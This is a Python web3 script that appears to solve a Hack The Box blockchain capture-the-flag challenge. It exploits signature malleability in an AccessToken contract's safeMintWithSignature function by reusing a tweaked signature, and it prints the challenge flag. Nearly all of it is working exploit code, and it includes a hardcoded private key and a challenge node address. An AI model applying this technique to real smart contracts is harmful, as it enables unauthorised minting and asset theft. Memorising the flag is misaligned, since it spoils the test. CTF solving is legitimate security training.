from web3 import Web3
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files
from eth_account import Account
from eth_account.messages import encode_defunct
from eth_utils import keccak

'''
Private key     :  0x1ec957b94a87fb5d1e598f6501a74de36f6b3daa55dd4545a389e539b433522e
Address         :  0xa867Ef37bFF7a66B7DF3e7623bF0ebA628fF6E3e
Target contract :  0x8771c7f6f1e714CD85c47afd4F81407c97376817
Setup contract  :  0x7D61caff92CF9C50411732b645235d0918fa4A38
'''

x = {
    "PrivateKey":    "0x1ec957b94a87fb5d1e598f6501a74de36f6b3daa55dd4545a389e539b433522e",
    "Address":       "0xa867Ef37bFF7a66B7DF3e7623bF0ebA628fF6E3e",
    "TargetAddress": "0x8771c7f6f1e714CD85c47afd4F81407c97376817",
    "setupAddress":  "0x7D61caff92CF9C50411732b645235d0918fa4A38"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

url = 'http://157.245.39.76:30145'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)
block = w3.eth.get_block(block_number)

'''
# Check if the block exists
if block is not None:
    # Access block information
    block_hash = block['hash']
    block_timestamp = block['timestamp']
    block_transactions = block['transactions']

    print(f"Block Number: {block_number}")
    print(f"Block Hash: {block_hash}")
    print(f"Block Timestamp: {block_timestamp}")
    print(f"Block Transactions: {block_transactions}")

    # Retrieve and print transaction details for each transaction in the block
    # Log -> Address
    for tx_hash in block_transactions:
        tx = w3.eth.get_transaction(tx_hash)
        if tx is not None:
            print(tx)

else:
    print(f"Block {block_number} not found.")

exit(0)
'''

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

install_solc("0.8.19")

compiled = compile_files(["AccessToken.sol"], output_values=["abi"], solc_version="0.8.19")
abi = compiled['AccessToken.sol:AccessToken']['abi']
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)

#4119d8a3ebe2b6f0fc891f40729db85f6967389cdedb4d64f2a381e4eb56ca0a0313f2cdc18ebcf80092826096006441fb7d27a71d0e91835dd1825810984d00c61b

#41 is length
#added 00 in the end

signature = bytes.fromhex('19d8a3ebe2b6f0fc891f40729db85f6967389cdedb4d64f2a381e4eb56ca0a0313f2cdc18ebcf80092826096006441fb7d27a71d0e91835dd1825810984d00c61b00')

construct_txn = contract_instance2.functions.safeMintWithSignature(signature, Address).build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		#'from': Target2Address,
		#'nonce': w3.eth.get_transaction_count(Target2Address),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)

tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')


compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.19")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved(Address).call()

print(f'The current number stored is: { number } ')
#HTB{519n47u23_m4113481117y_91v35_4u7h021235_4cc3551}
